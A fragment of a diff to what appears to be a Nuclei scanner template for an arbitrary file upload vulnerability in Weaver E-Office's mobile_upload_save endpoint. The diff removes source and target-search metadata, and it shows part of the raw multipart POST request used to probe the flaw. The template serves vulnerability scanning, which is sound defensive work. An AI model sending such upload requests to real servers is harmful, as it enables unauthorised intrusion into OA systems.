@@ -3,14 +3,8 @@ info:
   name: 泛微E-Officemobile_upload_save存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/35262a99540ac842253f0418324995da
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 35262a99540ac842253f0418324995da
-    fofa: + hunter`app.name="泛微 e-office OA"`
 http:
 - raw:
   - 'POST /E-mobile/App/Ajax/ajax.php?action=mobile_upload_save  HTTP/1.1
@@ -52,7 +46,6 @@ http:
     Content-Disposition: form-data; name="file"; filename=""
 
     Content-Type: application/octet-stream
-
 
 
     ------WebKitFormBoundarydRVCGWq4Cx3Sq6tt--'
